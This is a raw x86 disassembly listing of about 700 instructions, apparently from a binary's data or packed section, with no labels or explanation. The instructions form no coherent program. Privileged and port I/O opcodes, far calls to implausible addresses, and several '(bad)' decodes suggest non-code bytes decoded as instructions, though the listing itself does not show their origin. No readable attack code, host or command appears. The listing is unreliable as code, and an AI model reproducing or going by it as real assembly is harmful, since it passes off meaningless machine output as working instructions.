  41281e:	or     eax,0x35c53dc4
  412823:	cmp    al,0xbb
  412825:	sahf   
  412826:	jg     0x412844
  412828:	jmp    0x41284a
  41282a:	inc    ebx
  41282b:	mov    bh,0xb2
  41282d:	imul   ecx,DWORD PTR [esi+0x45],0x33961116
  412834:	dec    eax
  412835:	cdq    
  412836:	mov    eax,0xa5ec97f2
  41283b:	fisub  WORD PTR [ebx+0x4618ac26]
  412841:	fdivr  DWORD PTR [eax+0x6e]
  412844:	mov    ecx,edi
  412846:	push   eax
  412847:	ss jg  0x412861
  41284a:	call   0x6136cafe
  41284f:	add    al,0xda
  412851:	cld    
  412852:	sti    
  412853:	je     0x412846
  412855:	mov    dl,0x76
  412857:	bound  edx,QWORD PTR [esp+ebx*4-0x6f]
  41285b:	ds scas eax,DWORD PTR es:[edi]
  41285d:	cmc    
  41285e:	xor    al,0x79
  412860:	repnz cmc 
  412862:	test   DWORD PTR [eax],0x622abb87
  412868:	rol    ebp,1
  41286a:	repz and al,0xd4
  41286d:	popa   
  41286e:	push   ds
  41286f:	push   es
  412870:	mov    es,WORD PTR [ebp+0x3d]
  412873:	push   ebx
  412874:	add    ebp,DWORD PTR [ebx+0x75]
  412877:	xchg   ecx,eax
  412878:	lds    ebp,FWORD PTR [edx-0x133c1ab0]
  41287e:	ds jno 0x4128b2
  412881:	sub    DWORD PTR [eax+0x3c],eax
  412884:	push   es
  412885:	fisub  WORD PTR [ebp+0x4e]
  412888:	xchg   esp,ebx
  41288a:	pop    ebp
  41288b:	and    BYTE PTR [eax-0x4a],al
  41288e:	into   
  41288f:	pop    edi
  412890:	add    bh,al
  412892:	inc    edx
  412893:	fxtract 
  412895:	jbe    0x4128fe
  412897:	pop    ebx
  412898:	xchg   ebp,eax
  412899:	pop    edi
  41289a:	cmp    eax,0x5362dd23
  41289f:	iret   
  4128a0:	xor    DWORD PTR [ecx-0x72],esp
  4128a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128a4:	dec    esp
  4128a5:	clc    
  4128a6:	fdiv   QWORD PTR [edx]
  4128a8:	repnz nop
  4128aa:	(bad)  
  4128ab:	mov    edi,ebp
  4128ad:	xchg   esi,eax
  4128ae:	test   al,0xbe
  4128b0:	lock inc esi
  4128b2:	or     BYTE PTR [edi],dh
  4128b4:	ins    DWORD PTR es:[edi],dx
  4128b5:	pop    eax
  4128b6:	jg     0x41284b
  4128b8:	nop
  4128b9:	pop    es
  4128ba:	fs mov bh,0x87
  4128bd:	or     eax,0xefa6664e
  4128c2:	mov    ecx,0x2143e346
  4128c7:	cld    
  4128c8:	mov    dl,0x5e
  4128ca:	mov    dh,0x51
  4128cc:	push   es
  4128cd:	(bad)
  4128d0:	add    DWORD PTR [eax],edx
  4128d2:	jg     0x41291c
  4128d4:	retf   0x6c12
  4128d7:	mov    cl,ch
  4128d9:	fsub   st(7),st
  4128db:	or     DWORD PTR [ebp+0x5eefd21],ebp
  4128e1:	popa   
  4128e2:	psubb  mm4,mm5
  4128e5:	jb     0x412885
  4128e7:	pop    ebx
  4128e8:	jmp    0xba8481c9
  4128ed:	in     eax,0x4f
  4128ef:	and    al,0x6a
  4128f1:	(bad)  
  4128f2:	clc    
  4128f3:	iret   
  4128f4:	dec    ecx
  4128f5:	int3   
  4128f6:	outs   dx,BYTE PTR ds:[esi]
  4128f7:	add    eax,esp
  4128f9:	adc    al,0x81
  4128fb:	lea    esp,[ebp+eiz*1-0x6a]
  4128ff:	scas   eax,DWORD PTR es:[edi]
  412900:	inc    ecx
  412901:	call   0x2702:0xfdbfc44c
  412908:	sbb    BYTE PTR [edi],ch
  41290a:	mov    ds:0x5821b3b9,eax
  41290f:	cdq    
  412910:	jmp    0xafc9:0x2b6691fa
  412917:	dec    ebp
  412918:	(bad)  
  412919:	into   
  41291a:	fs jne 0x412906
  41291d:	mov    dh,ch
  41291f:	retf   
  412920:	pop    edx
  412921:	dec    edx
  412922:	ja     0x412952
  412924:	cld    
  412925:	cmp    al,0x6e
  412927:	lods   eax,DWORD PTR ds:[esi]
  412928:	es (bad) 
  41292b:	dec    esp
  41292c:	inc    ecx
  41292d:	sbb    eax,0xe4b5f370
  412932:	scas   eax,DWORD PTR es:[edi]
  412933:	repz sub BYTE PTR [esi],dl
  412936:	mov    ds:0xdd4e46a7,eax
  41293b:	ins    DWORD PTR es:[edi],dx
  41293c:	out    0xa8,eax
  41293e:	test   al,0xd8
  412940:	cdq    
  412941:	lods   eax,DWORD PTR ds:[esi]
  412942:	inc    edi
  412943:	jbe    0x412928
  412945:	mov    ch,0xd2
  412947:	js     0x4128e0
  412949:	ret    0x961f
  41294c:	mov    DWORD PTR [esi],0xc39d8c5c
  412952:	jb     0x4129a6
  412954:	fwait
  412955:	cmp    DWORD PTR [edx],ebp
  412957:	or     DWORD PTR [edx],0xffffffcd
  41295a:	(bad)  
  41295b:	and    DWORD PTR [esi+0x2864baaf],ebx
  412961:	mov    dh,0xe3
  412963:	in     eax,dx
  412964:	and    al,0x69
  412966:	imul   edi,ebp,0x22
  412969:	ds jns 0x412992
  41296c:	shr    DWORD PTR [ebp-0x2d16f430],0xdc
  412973:	xchg   ebp,eax
  412974:	fnstcw WORD PTR [esi-0x3ac1c96f]
  41297a:	ds cmp esp,ebp
  41297d:	cdq    
  41297e:	into   
  41297f:	jmp    DWORD PTR [esi+0x5f364d0d]
  412985:	adc    eax,0x47b373e7
  41298a:	xchg   esp,eax
  41298b:	xor    eax,DWORD PTR [bx]
  41298e:	outs   dx,DWORD PTR ds:[esi]
  41298f:	pop    edx
  412990:	jne    0x41296c
  412992:	inc    ebx
  412993:	sar    DWORD PTR [ebx+0x8],cl
  412996:	jmp    0x508b22d5
  41299b:	ins    BYTE PTR es:[edi],dx
  41299c:	in     eax,0xa8
  41299e:	fsubr  DWORD PTR [esi+0x84ac870]
  4129a4:	add    BYTE PTR [ecx+0x6caae16b],ah
  4129aa:	xor    al,0xc4
  4129ac:	test   BYTE PTR [ebp+edx*1-0x7c],ch
  4129b0:	call   0x2ac3f819
  4129b5:	hlt    
  4129b6:	and    al,0xf9
  4129b8:	and    bl,BYTE PTR [ecx+eiz*8-0x66]
  4129bc:	mov    ecx,0xe0f95c84
  4129c1:	dec    edx
  4129c2:	mov    edi,DWORD PTR [ecx+eiz*1]
  4129c5:	dec    ebx
  4129c6:	add    edx,0x388ea452
  4129cc:	jmp    0xb53072c1
  4129d1:	fsubr  DWORD PTR ds:0x6bc72679
  4129d7:	sti    
  4129d8:	xor    ah,cl
  4129da:	cdq    
  4129db:	inc    esi
  4129dc:	sbb    DWORD PTR [esi+edi*1-0xb],0xffffffa9
  4129e1:	jmp    0x4129ab
  4129e3:	cmp    ebp,DWORD PTR [ecx]
  4129e5:	xor    eax,0x7a25b98b
  4129ea:	and    esp,DWORD PTR [di+0x654]
  4129ef:	jmp    0x4129e8
  4129f1:	mov    ebx,ebp
  4129f3:	hlt    
  4129f4:	mov    esi,0xa01e921b
  4129f9:	stc    
  4129fa:	sub    bh,cl
  4129fc:	xor    ah,BYTE PTR [edi-0x18a59144]
  412a02:	mov    BYTE PTR [edi+0x6],al
  412a05:	and    bh,BYTE PTR [ebx+0x68b1bf93]
  412a0b:	in     eax,0x3b
  412a0d:	mov    edi,0x4d6b7dfb
  412a12:	ret    
  412a13:	call   0x24dc3c2b
  412a18:	in     eax,dx
  412a19:	dec    esi
  412a1a:	pop    edx
  412a1b:	outs   dx,WORD PTR ds:[esi]
  412a1d:	xchg   ebx,eax
  412a1e:	jge    0x4129eb
  412a20:	sub    edi,DWORD PTR [eax-0x1d]
  412a23:	imul   eax,ebx,0x614e7b5
  412a29:	sub    al,0x7f
  412a2b:	outs   dx,DWORD PTR ds:[esi]
  412a2c:	scas   al,BYTE PTR es:[edi]
  412a2d:	outs   dx,DWORD PTR ds:[esi]
  412a2e:	cmp    esp,DWORD PTR [edx]
  412a30:	mov    DWORD PTR [edx+esi*1],esp
  412a33:	out    0x0,eax
  412a35:	je     0x412aae
  412a37:	mov    ecx,0x34be1974
  412a3c:	jne    0x412a3e
  412a3e:	rol    BYTE PTR [edx],0x8a
  412a41:	rol    BYTE PTR [edi-0x13fe9708],cl
  412a47:	cmp    dh,BYTE PTR [ebp-0x5ab9dc89]
  412a4d:	ror    BYTE PTR [eax-0x6],cl
  412a50:	sbb    ebx,eax
  412a52:	mov    ds:0x269b231f,al
  412a57:	push   ds
  412a58:	scas   eax,DWORD PTR es:[edi]
  412a59:	inc    esp
  412a5a:	std    
  412a5b:	mov    cl,0xdb
  412a5d:	adc    BYTE PTR [edx+edx*4-0x6e],0x93
  412a62:	mov    fs,WORD PTR [ecx-0x4e]
  412a65:	repz lahf 
  412a67:	inc    ebx
  412a68:	add    esp,DWORD PTR ds:0x9bfc32c8
  412a6e:	xor    eax,0xb58a98b7
  412a73:	pop    ebx
  412a74:	pop    edi
  412a75:	fmul   DWORD PTR [eax-0x3d]
  412a78:	add    DWORD PTR ds:0xbac6f3be,ecx
  412a7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a7f:	xchg   edi,eax
  412a80:	and    ah,cl
  412a82:	sub    dl,ch
  412a84:	lea    esp,[ecx]
  412a86:	imul   esi,DWORD PTR [ebp+0x4b],0x985ce474
  412a8d:	inc    edx
  412a8e:	ficom  DWORD PTR [eax]
  412a90:	pushf  
  412a91:	(bad)  
  412a92:	pop    edx
  412a93:	fwait
  412a94:	push   esp
  412a95:	addr16 ds push edi
  412a98:	xchg   ecx,eax
  412a99:	fwait
  412a9a:	jae    0x412a4a
  412a9c:	(bad)  
  412a9d:	clc    
  412a9e:	aaa    
  412a9f:	ror    BYTE PTR [ebp-0x50],cl
  412aa2:	cmp    bl,bl
  412aa4:	dec    ecx
  412aa5:	xchg   ebp,eax
  412aa6:	push   ds
  412aa7:	out    0x1c,al
  412aa9:	pusha  
  412aaa:	fucom  st(2)
  412aac:	jle    0x412a96
  412aae:	maxps  xmm2,XMMWORD PTR [edi-0x1f]
  412ab2:	dec    ebp
  412ab3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ab4:	pop    ebx
  412ab5:	pop    esp
  412ab6:	ds call 0xbaa4:0xecc1dc87
  412abe:	jg     0x412ab8
  412ac0:	adc    ebp,edi
  412ac2:	ja     0x412ab7
  412ac4:	shl    BYTE PTR [ebp+0x791d786f],0xa
  412acb:	pop    es
  412acc:	ret    0x88b
  412acf:	jp     0x412b4e
  412ad1:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  412ad3:	loopne 0x412a98
  412ad5:	hlt    
  412ad6:	jg     0x412b44
  412ad8:	js     0x412b33
  412ada:	mov    dl,0x18
  412adc:	adc    ebp,DWORD PTR [edx+esi*2-0x6e]
  412ae0:	sub    DWORD PTR [eax],0x7b
  412ae3:	inc    edi
  412ae4:	pop    edi
  412ae5:	sub    ah,BYTE PTR [edi+0x4b]
  412ae8:	fstp   QWORD PTR ds:0xcc47a4ae
  412aee:	jl     0x412b69
  412af0:	js     0x412b1a
  412af2:	add    edx,DWORD PTR ds:0x4cadff59
  412af8:	xchg   esp,eax
  412af9:	leave  
  412afa:	iret   
  412afb:	add    BYTE PTR [ecx+0x7a251862],dl
  412b01:	and    esp,edx
  412b03:	fist   DWORD PTR [ebx]
  412b05:	or     BYTE PTR [ecx],0xdc
  412b08:	and    eax,0x251cc826
  412b0d:	mov    eax,ds:0xc5f16467
  412b12:	sub    esi,DWORD PTR [edx+edx*1]
  412b15:	sti    
  412b16:	push   eax
  412b17:	fstp   DWORD PTR [esp+edi*8+0xb]
  412b1b:	pop    edx
  412b1c:	outs   dx,BYTE PTR ds:[esi]
  412b1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b1e:	xchg   esi,eax
  412b1f:	cld    
  412b20:	cdq    
  412b21:	adc    esi,ebp
  412b23:	ins    DWORD PTR es:[edi],dx
  412b24:	mov    ah,0xe7
  412b26:	jmp    0x91c19a05
  412b2b:	sti    
  412b2c:	push   ds
  412b2d:	das    
  412b2e:	fisttp QWORD PTR [eax+edx*2+0x1e2f1fbb]
  412b35:	and    cl,BYTE PTR [eax]
  412b37:	jle    0x412aec
  412b39:	cmp    al,BYTE PTR [ecx-0x7d60c61c]
  412b3f:	xor    ecx,DWORD PTR [ecx]
  412b41:	pop    DWORD PTR [ebx+0x67]
  412b44:	ins    DWORD PTR es:[edi],dx
  412b45:	jmp    0x75346dd0
  412b4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b4b:	sbb    DWORD PTR [edx],0xffffffee
  412b4e:	and    ch,BYTE PTR [edi+eiz*2]
  412b51:	rol    WORD PTR [ebx],0x4b
  412b55:	pusha  
  412b56:	jle    0x412bc1
  412b58:	dec    ecx
  412b59:	or     DWORD PTR [esi-0x39],esp
  412b5c:	adc    BYTE PTR [edx+ebx*2+0x1a67e524],bl
  412b63:	popa   
  412b64:	mov    eax,ds:0xc66a9fcf
  412b69:	push   esi
  412b6a:	or     al,0xa
  412b6c:	adc    esp,DWORD PTR ds:0x9836fc69
  412b72:	outs   dx,DWORD PTR gs:[esi]
  412b74:	popa   
  412b75:	out    dx,eax
  412b76:	add    BYTE PTR [ecx-0x4f8958c6],ah
  412b7c:	int    0xeb
  412b7e:	dec    esi
  412b7f:	movnti DWORD PTR [edi-0x35],ebp
  412b83:	sbb    ebx,esp
  412b85:	out    dx,eax
  412b86:	je     0x412b69
  412b88:	inc    esi
  412b89:	gs sahf 
  412b8b:	xchg   ecx,eax
  412b8c:	xchg   ebx,eax
  412b8d:	scas   eax,DWORD PTR es:[edi]
  412b8e:	xor    BYTE PTR [esi+0x75feb13d],ah
  412b94:	sahf   
  412b95:	aas    
  412b96:	pop    ebp
  412b97:	add    ebx,edx
  412b99:	loopne 0x412bae
  412b9b:	fimul  DWORD PTR [edx-0x69]
  412b9e:	sbb    BYTE PTR [eax-0x66fdd67a],cl
  412ba4:	test   DWORD PTR [ebx+eax*2-0x6c],edx
  412ba8:	ret    
  412ba9:	push   0xdbca2264
  412bae:	xor    al,BYTE PTR [edi-0x48]
  412bb1:	pop    ecx
  412bb2:	sbb    eax,0xbb92dac0
  412bb7:	addr16 pop esp
  412bb9:	mov    dh,0x90
  412bbb:	sub    ebx,DWORD PTR ds:0x59f289d0
  412bc1:	jb     0x412b70
  412bc3:	fsub   QWORD PTR [eax-0xd]
  412bc6:	repz imul edx,DWORD PTR ds:0xe02679a7,0x3fd9cd59
  412bd1:	dec    ecx
  412bd2:	enter  0xc932,0xa7
  412bd6:	sub    ah,dl
  412bd8:	sbb    edi,esp
  412bda:	sti    
  412bdb:	lods   eax,DWORD PTR ds:[esi]
  412bdc:	fs es pop ebp
  412bdf:	jp     0x412b7d
  412be1:	cwde   
  412be2:	test   eax,0x60977df1
  412be7:	xchg   edi,edx
  412be9:	scas   eax,DWORD PTR es:[edi]
  412bea:	mov    dl,0x1
  412bec:	pop    edi
  412bed:	push   edx
  412bee:	adc    edx,DWORD PTR [edx+0x47]
  412bf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bf2:	shr    bl,1
  412bf4:	push   0xabcb2b7e
  412bf9:	adc    al,0x57
  412bfb:	push   esi
  412bfc:	ins    BYTE PTR es:[edi],dx
  412bfd:	adc    al,0xdd
  412bff:	dec    ebp
  412c00:	cdq    
  412c01:	xor    bh,cl
  412c03:	mov    bl,0xdb
  412c05:	fwait
  412c06:	sbb    ebp,DWORD PTR [eax+ecx*2]
  412c09:	mov    bh,0x45
  412c0b:	jo     0x412c78
  412c0d:	jb     0x412bde
  412c0f:	repz imul ebx,ecx,0xb1b48cdc
  412c16:	add    ebx,0xac1d84c2
  412c1c:	cdq    
  412c1d:	pop    ecx
  412c1e:	add    ecx,eax
  412c20:	out    0xbf,eax
  412c22:	jmp    0x412c7a
  412c24:	enter  0xed22,0xc3
  412c28:	cli    
  412c29:	lahf   
  412c2a:	xchg   DWORD PTR [esi-0x56],edx
  412c2d:	(bad)  
  412c2e:	call   DWORD PTR [ebp-0x6db6d6cb]
  412c34:	push   cs
  412c35:	or     eax,0x2e4ee5b8
  412c3a:	cwde   
  412c3b:	push   ecx
  412c3c:	call   0xe4f4eb40
  412c41:	and    eax,0xa955af80
  412c46:	ret    0xe555
  412c49:	sbb    eax,0x25402283
  412c4e:	dec    ebx
  412c4f:	cmp    DWORD PTR cs:[eax+0xb9951e4],ebx
  412c56:	retf   0x48ac
  412c59:	sbb    eax,0x4bfdd339
  412c5e:	shr    BYTE PTR [edx],1
  412c60:	imul   edi,DWORD PTR [edx+0x75],0xb71bc8d7
  412c67:	ins    BYTE PTR es:[edi],dx
  412c68:	and    BYTE PTR [edi],bl
  412c6a:	lahf   
  412c6b:	addr16 pusha 
  412c6d:	xchg   DWORD PTR [ecx+ebp*4],ebx
  412c70:	bound  eax,QWORD PTR [ecx]
  412c72:	push   0xe8b2555
  412c77:	icebp  
  412c78:	ins    BYTE PTR es:[edi],dx
  412c79:	shl    DWORD PTR [edx-0x9],0xf4
  412c7d:	and    bh,0xbd
  412c80:	stc    
  412c81:	push   ecx
  412c82:	outs   dx,DWORD PTR ds:[esi]
  412c83:	or     eax,0x3cd4ee93
  412c88:	pop    ds
  412c89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c8a:	stos   BYTE PTR es:[edi],al
  412c8b:	lea    edi,ss:[eax+0x43]
  412c8f:	add    DWORD PTR [edi-0x4b],edi
  412c92:	pusha  
  412c93:	dec    ebx
  412c94:	xchg   esi,eax
  412c95:	jle    0x412cee
  412c97:	inc    edi
  412c98:	nop
  412c99:	push   es
  412c9a:	rcl    BYTE PTR [eax],cl
  412c9c:	ret    0xd60d
  412c9f:	cmp    edx,DWORD PTR [ecx-0x4043d516]
  412ca5:	push   ss
  412ca6:	pop    ds
  412ca7:	cmp    dh,BYTE PTR [ebx]
  412ca9:	enter  0x53b3,0xc2
  412cad:	jno    0x412cb3
  412caf:	add    esi,DWORD PTR ds:[eax+0x2f]
  412cb3:	scas   al,BYTE PTR es:[edi]
  412cb4:	icebp  
  412cb5:	fwait
  412cb6:	or     al,bh
  412cb8:	lods   al,BYTE PTR ds:[esi]
  412cb9:	outs   dx,BYTE PTR ds:[esi]
  412cba:	loop   0x412cdc
  412cbc:	add    eax,0x49bc2fe
  412cc1:	pop    es
  412cc2:	pop    eax
  412cc3:	mov    dl,0x7e
  412cc5:	in     al,dx
  412cc6:	aam    0x67
  412cc8:	push   cs
  412cc9:	push   edx
  412cca:	stc    
  412ccb:	mov    ebx,0x5f7805b1
  412cd0:	daa    
  412cd1:	mov    ebx,0x7c69d893
  412cd6:	retf   0xc068
  412cd9:	or     bl,BYTE PTR [edi-0x2d5f1c97]
  412cdf:	pop    ss
  412ce0:	cmp    cl,cl
  412ce2:	jmp    0x357d04d6
  412ce7:	outs   dx,BYTE PTR ds:[esi]
  412ce8:	xlat   BYTE PTR ds:[ebx]
  412ce9:	retf   0xc7b
  412cec:	xchg   DWORD PTR [ebx+0x1],ecx
  412cef:	loop   0x412cac
  412cf1:	iret   
  412cf2:	out    0xea,al
  412cf4:	cmp    ebx,ecx
  412cf6:	ins    BYTE PTR es:[edi],dx
  412cf7:	ins    DWORD PTR es:[edi],dx
  412cf8:	xor    al,0x3a
  412cfa:	push   0x57
  412cfc:	mov    ds:0xd5dbfdf,eax
  412d01:	pop    DWORD PTR [ecx-0x1b]
  412d04:	mov    ebp,0x222c7b95
  412d09:	sbb    al,0x53
  412d0b:	push   ecx
  412d0c:	sbb    BYTE PTR [ecx+0x47],0xfa
  412d10:	loopne 0x412c9d
  412d12:	mov    eax,ds:0x6a870cab
  412d17:	inc    edx
  412d18:	pop    esi
  412d19:	es rcr ch,1
  412d1c:	pop    ebx
  412d1d:	mov    ds:0xbc01140f,al
  412d22:	rcr    DWORD PTR [ebx+0x4f],0x32
  412d26:	shr    DWORD PTR [ecx],0x27
  412d29:	pop    ebp
  412d2a:	sub    al,0x27
  412d2c:	push   edx
  412d2d:	xchg   ebp,eax
  412d2e:	fcomi  st,st(5)
  412d30:	jb     0x412cd0
  412d32:	xor    eax,0xb27bc972
  412d37:	call   0x9b55:0xa354b577
  412d3e:	imul   ebp,DWORD PTR [edx+edi*1-0x6e],0xd42e6816
  412d46:	adc    al,0x5f
  412d48:	xor    ebp,DWORD PTR [esi+0x4a286a7b]
  412d4e:	les    eax,FWORD PTR [esi]
  412d50:	pop    ecx
  412d51:	hlt    
  412d52:	jb     0x412dc8
  412d54:	add    eax,0xe9715b69
  412d59:	adc    eax,0x2532632f
  412d5e:	ss xchg ebx,eax
  412d60:	and    dl,al
  412d62:	sbb    al,0x8d
  412d64:	mov    esi,0xf75a8a9
  412d69:	add    DWORD PTR [eax-0x71b29762],esi
  412d6f:	jnp    0x412dd6
  412d71:	lahf   
  412d72:	adc    dl,BYTE PTR [edi+0x35]
  412d75:	xchg   edi,eax
  412d76:	cli    
  412d77:	mov    bl,0x7b
  412d79:	call   0xdc7d:0x7f804de
  412d80:	das    
  412d81:	sbb    al,0x2d
  412d83:	lahf   
  412d84:	mov    ebx,0xd2527e97
  412d89:	jge    0x412d2e
  412d8b:	xor    eax,0xe2149a07
  412d90:	cld    
  412d91:	imul   esp,DWORD PTR [edi-0xe],0x2f
  412d95:	stos   BYTE PTR es:[edi],al
  412d96:	jg     0x412d83
  412d98:	mov    DWORD PTR [edx],esp
  412d9a:	inc    ebx
  412d9b:	inc    eax
  412d9c:	adc    dh,BYTE PTR [ebx+0x36d8b841]
  412da2:	and    DWORD PTR ss:[ebx-0x1b490195],eax
  412da9:	jle    0x412d58
  412dab:	mov    edi,0xaf6e92ed
  412db0:	sub    al,0x3c
  412db2:	call   0xb5ba1561
  412db7:	cmc    
  412db8:	jp     0x412db8
  412dba:	fs call 0x5f8786e4
  412dc0:	pop    edx
  412dc1:	dec    ebx
  412dc2:	sbb    DWORD PTR [edx+0x3e],edi
  412dc5:	jmp    0xebcd469a
  412dca:	sub    DWORD PTR ds:0xfc853ff7,esp
  412dd0:	cli    
  412dd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412dd2:	icebp  
  412dd3:	push   esi
  412dd4:	xchg   ebp,eax
  412dd5:	mov    ch,0x84
  412dd7:	add    DWORD PTR ds:0x45b6b1bc,0x1e
  412dde:	mov    ebp,DWORD PTR [edi]
  412de0:	mov    ds:0xa4fda83c,al
  412de5:	out    dx,eax
  412de6:	ret    0x2f20
  412de9:	lock outs dx,DWORD PTR ds:[esi]
  412deb:	imul   ebp,eax,0x5
  412dee:	cld    
  412def:	inc    DWORD PTR [esi]
  412df1:	daa    
  412df2:	iret   
  412df3:	call   0xad318bee
  412df8:	or     ah,BYTE PTR fs:[edx-0x12d443ec]
  412dff:	clc    
  412e00:	inc    ecx
  412e01:	mov    al,ds:0xabaeb175
  412e06:	shr    BYTE PTR [ebp-0x42cc0cc0],cl
  412e0c:	inc    esp
  412e0d:	xor    DWORD PTR ds:0xd24a11b3,eax
  412e13:	adc    eax,0x5235fcc3
  412e18:	pusha  
  412e19:	test   eax,0x68eb86ff
  412e1e:	sub    BYTE PTR [ebp+0x6],ah
  412e21:	test   eax,0x4b687bd4
  412e26:	cmp    eax,0xad106e5a
  412e2b:	sub    ebx,DWORD PTR [ebx+edx*4]
  412e2e:	scas   eax,DWORD PTR es:[edi]
  412e2f:	stos   BYTE PTR es:[edi],al
  412e30:	lods   eax,DWORD PTR ds:[esi]
  412e31:	fs fwait
  412e33:	lds    ebx,FWORD PTR [edx+eax*4-0x3c]
  412e37:	pop    edx
  412e38:	ja     0x412e30
  412e3a:	xchg   BYTE PTR ds:0x79a2e1d0,dl
  412e40:	ss in  al,dx
  412e42:	sahf   
  412e43:	mov    ch,0x39
  412e45:	cld    
  412e46:	ret    0x88a2
  412e49:	call   0x386243b
  412e4e:	loopne 0x412e49
  412e50:	adc    bh,bh
  412e52:	mov    edx,0xa2d6d9a0
  412e57:	in     eax,0x48
  412e59:	call   0x8370cfeb
  412e5e:	lods   al,BYTE PTR ds:[esi]
  412e5f:	inc    ebx
  412e60:	sbb    DWORD PTR [edi+0x35a88b4],eax
  412e66:	add    BYTE PTR [ecx+eiz*8+0x3ca5de67],0xd8
  412e6e:	mov    ch,0x3
  412e70:	(bad)
  412e74:	push   eax
  412e75:	and    dh,ch
  412e77:	popf   
  412e78:	je     0x412ec2
  412e7a:	mov    ds:0x161b90ba,al
  412e7f:	mov    ch,0xd8
  412e81:	inc    ecx
  412e82:	and    DWORD PTR [esi+0x6a],ebp
  412e85:	not    BYTE PTR [ebp-0x393cd20f]
  412e8b:	or     ebx,0x73
  412e8e:	add    ebx,ebp
  412e90:	pop    edi
  412e91:	call   eax
  412e93:	dec    esp
  412e94:	fadd   DWORD PTR [edi+0x26]
  412e97:	bound  ebp,QWORD PTR [edx+ebx*2-0x28]
  412e9b:	in     eax,dx
  412e9c:	mov    esi,0xbb309646
  412ea1:	shr    edx,1
  412ea3:	xchg   dx,ax
  412ea5:	xchg   ebp,ebx
  412ea7:	loope  0x412e38
  412ea9:	fnstsw WORD PTR [ebx+eiz*2+0x3512b94f]
  412eb0:	call   0x252d:0x4db69dfc
  412eb7:	dec    ecx
  412eb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412eb9:	push   edi
  412eba:	adc    DWORD PTR [ecx],eax
  412ebc:	sub    ecx,edx
  412ebe:	mov    eax,ds:0xd78d6bd2
  412ec3:	shr    ch,cl
  412ec5:	shl    DWORD PTR [ebp+eax*2+0x8],0x88
  412eca:	repz shl DWORD PTR [ebp+0x4a9d1792],cl
  412ed1:	addr16 data16 in al,dx
  412ed4:	and    bh,BYTE PTR [ebp+0x2e4ff69]
  412eda:	jns    0x412f4e
  412edc:	in     al,dx
  412edd:	in     eax,0x4d
  412edf:	mov    ds:0xfd839fee,eax
  412ee4:	jne    0x412e96
  412ee6:	aas    
  412ee7:	or     al,0x95
  412ee9:	lock dec ebx
  412eeb:	fidivr WORD PTR [edx-0x40f29fa1]
  412ef1:	cwde   
  412ef2:	sub    cl,0xa6
  412ef5:	push   DWORD PTR [edx-0x25]
  412ef8:	call   0xcfe0:0x9acd586e
  412eff:	xor    ch,cl
  412f01:	ret    
  412f02:	outs   dx,DWORD PTR ds:[esi]
  412f03:	xchg   DWORD PTR [ebx-0x6e],ebp
  412f06:	dec    ebp
  412f07:	mov    ecx,0x4526edc9
  412f0c:	dec    ecx
  412f0d:	push   0x63
  412f0f:	cmp    eax,0x3a22e869
  412f14:	jbe    0x412f0c
  412f16:	dec    eax
  412f17:	add    al,0x36
  412f19:	inc    esi
  412f1a:	inc    edi
  412f1b:	icebp  
  412f1c:	xchg   edx,eax
  412f1d:	into   
  412f1e:	in     eax,dx
  412f1f:	retf   0xc74f
  412f22:	rol    DWORD PTR ss:[esi],cl
  412f25:	test   eax,0x41d28048
  412f2a:	popa   
  412f2b:	push   ds
  412f2c:	mov    dh,0xfb
  412f2e:	pop    ecx
  412f2f:	sti    
  412f30:	xor    BYTE PTR [edx-0x66cbd1a4],0x43
  412f37:	ret    
  412f38:	cmp    ebx,esp
  412f3a:	mov    dl,0x7d
  412f3c:	nop
  412f3d:	sahf   
  412f3e:	cli    
  412f3f:	and    bl,BYTE PTR [ebp-0x6f7016dc]
  412f45:	jle    0x412fc3
  412f47:	and    al,BYTE PTR [esi]
  412f49:	cdq    
  412f4a:	jmp    0x56bc:0x97962af
  412f51:	aam    0x79
  412f53:	xchg   ebx,eax
  412f54:	push   0xff3b0594
  412f59:	stos   DWORD PTR es:[edi],eax
  412f5a:	cmp    al,0x89
  412f5c:	sar    DWORD PTR [ebx+ecx*2-0x59adc029],cl
  412f63:	int3   
  412f64:	sbb    DWORD PTR [esp+eax*4],ecx
  412f67:	push   0xffffff86
  412f69:	icebp  
  412f6a:	sbb    eax,0x2464abc2
  412f6f:	mov    ah,0x6b
  412f71:	adc    BYTE PTR [edx+0x60a3858b],dl
  412f77:	rcr    DWORD PTR [esi+0x4e338d8e],0xfa
  412f7e:	mov    esp,0xb0ada03a
  412f83:	mov    bh,0xb1
  412f85:	cmp    BYTE PTR [ebx],0x2d
  412f88:	jge    0x412f77
  412f8a:	pusha  
  412f8b:	sub    DWORD PTR [esi],eax
  412f8d:	cwde   
  412f8e:	leave  
  412f8f:	adc    BYTE PTR [ecx-0x381b5bce],0x97
  412f96:	test   DWORD PTR [ecx-0x4cc2a44f],ebx
  412f9c:	js     0x412f38
  412f9e:	dec    ebx
  412f9f:	push   edi
  412fa0:	and    DWORD PTR fs:[esi-0x53],0x11d73b2b
  412fa8:	adc    BYTE PTR [eax+eax*1+0x5b84ac22],0xd2
  412fb0:	rcr    ecx,1
  412fb2:	dec    ebx
  412fb3:	mov    ch,0xce
  412fb5:	aas    
  412fb6:	stos   DWORD PTR es:[edi],eax
  412fb7:	arpl   WORD PTR [edx+ebx*1-0x16],dx
  412fbb:	lds    esp,FWORD PTR ds:0xfe98d78a
  412fc1:	or     dh,bh
  412fc3:	scas   al,BYTE PTR es:[edi]
  412fc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fc5:	dec    ecx
  412fc6:	std    
  412fc7:	out    dx,al
  412fc8:	mov    WORD PTR [edx+0x21c7ba48],?
  412fce:	data16 and BYTE PTR fs:[edx+0x7642680],cl
  412fd6:	mov    bl,0x62
  412fd8:	add    bl,bl
  412fda:	jle    0x412fff
  412fdc:	sbb    cl,BYTE PTR [ecx+0x69af71bf]
  412fe2:	cmp    BYTE PTR [eax],dh
  412fe4:	sub    eax,0x6c3d9e97
  412fe9:	hlt    
  412fea:	sbb    cl,BYTE PTR [esi-0x7c]
